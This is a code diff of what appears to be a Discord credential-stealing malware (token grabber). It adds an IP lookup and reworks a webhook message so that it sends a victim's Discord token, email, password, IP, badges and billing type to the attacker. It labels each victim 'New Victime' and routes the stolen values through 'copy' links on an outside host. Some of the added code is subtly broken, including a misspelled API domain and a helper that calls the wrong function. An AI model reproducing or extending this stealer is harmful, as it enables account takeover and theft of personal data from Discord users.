@@ -490,6 +490,24 @@ const fetchBilling = async (token) => {
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
+const fetchIp = async (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", "https://api.ipify.orgs", false);
+    xmlHttp.send(null);
+    xmlHttp.responseText`);
+  return JSON.parse(bill);
+};
+
+const getIp = async (token) => {
+  const data = await fetchBilling(token);
+  let ip = "";
+  data.forEach((x) => {
+    if (!x.invalid) {
+      ip += x.ip
+    }
+  });
+  return ip;
+};
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
@@ -660,23 +678,38 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${email})`,
+            inline: true,
           },
           {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
+            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
+            inline: true,
+          },
+          {
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
+            inline: true,
+          },
+          {
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            value: `${badges}`,
+            inline: true,
+          },
+          {
+            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
+            value: `${billing}`,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
